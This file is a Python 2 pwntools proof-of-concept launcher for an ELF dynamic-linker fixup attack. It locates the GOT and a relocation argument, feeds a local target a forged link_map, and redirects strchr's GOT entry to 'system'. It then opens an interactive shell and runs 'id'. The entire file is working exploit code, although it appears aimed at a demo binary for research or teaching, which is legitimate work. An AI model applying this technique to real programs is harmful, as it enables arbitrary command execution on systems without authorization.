"""
launcher for example_poc_fixup
usage: python <target>

automatically finds GOT address and reloc_arg of strchr@plt function
"""
import sys
from pwn import *

from generate32 import create_link_map32
from generate64 import create_link_map64

breaks = [
        ('main', 212),
        ]

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print 'Usage: python %s target' % sys.argv[0]
        sys.exit(0)
    _target = sys.argv[1]
    p = process(_target)
    #gdb_attatch(p, breaks, True)
    elf = ELF(_target)

    # got address
    GOT = elf.symbols['_GLOBAL_OFFSET_TABLE_']
    # get reloc_arg from strchr@plt function - argument of push instruction
    strchr = elf.plt['strchr']
    reloc_arg = 2  # ord(elf.read(strchr, 8)[-1])

    # optional parameter: addr to store value, found by fixup
    # may be any writable memory, for this POC we will
    # store addr of 'system' function to got[STRCHR]
    got_strchr = elf.symbols['got.strchr']

    sleep(0.5)
    print p.recv()
    p.sendline('{:x} {:x}'.format(GOT, reloc_arg))

    _o = p.recvuntil('3 outputs\n')
    print _o
    outputs = p.recvuntil('end 3 outputs\n')
    sint_list = outputs.strip().split()[:3]
    new_lm_addr, old_lm_addr, reloc_arg2 = [int(i) for i in sint_list]
    assert reloc_arg2 == reloc_arg
    print 'outputs:', outputs
    print 'old_link_map addr, reloc_arg:', old_lm_addr, reloc_arg
    # create fake_link_map
    # runtime params:
    #   new_addr and old_addr depends on binary,
    #   in real life you need to exploit a vulnerability to get them
    # rest params: we can choose as we want
    strtab = 'AAAAsystem\x00' # we pass this string as a strtab
    srindex = (4, reloc_arg) # index in strtab, reloc_arg

    #fake_link_map = create_link_map32(new_lm_addr, old_lm_addr, got_strchr, strtab, srindex)
    fake_link_map = create_link_map64(new_lm_addr, old_lm_addr, got_strchr, strtab, srindex)
    #fake_link_map = 'ABCD' * 10

    print 'generated %d length link_map' % len(fake_link_map)
    p.sendline('%d' % len(fake_link_map))
    sleep(0.1)


    p.send(fake_link_map)
    print 'here'
    print p.recvuntil('finish')
    #sys.exit(0)

    sleep(0.1)
    print p.recv()
    p.interactive()

    p.sendline('id')
    print 'id returns:'
    sleep(0.1)
    print p.recv()

